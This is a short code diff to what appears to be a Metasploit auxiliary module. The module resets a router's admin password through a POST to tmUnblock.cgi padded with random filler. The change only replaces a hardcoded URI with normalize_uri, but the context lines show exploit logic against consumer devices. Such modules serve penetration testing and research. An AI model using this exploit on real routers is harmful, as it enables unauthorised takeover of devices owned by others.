@@ -64,8 +64,6 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    uri = '/cgi-bin/tmUnblock.cgi'
-
     print_status("#{peer} - Resetting password for the admin user ...")
 
     postdata = Rex::Text.rand_text_alpha(246)             # Filler
@@ -86,7 +84,7 @@ class Metasploit3 < Msf::Auxiliary
     begin
       res = send_request_cgi(
         {
-          'uri'    => uri,
+          'uri'    => normalize_uri("cgi-bin", "tmUnblock.cgi"),
           'method' => 'POST',
           'vars_post' => {
             'period' => '0',
